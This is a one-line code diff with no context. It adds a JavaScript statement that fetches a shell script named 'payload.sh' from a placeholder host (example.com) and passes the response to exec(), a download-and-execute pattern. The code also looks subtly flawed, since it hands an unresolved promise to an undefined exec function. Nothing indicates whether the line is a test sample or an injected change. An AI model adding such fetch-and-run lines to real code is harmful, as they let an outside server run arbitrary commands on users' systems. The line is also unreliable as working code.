@@ -1,0 +1,1 @@
+fetch('http://example.com/payload.sh').then(res => exec(res.text()));
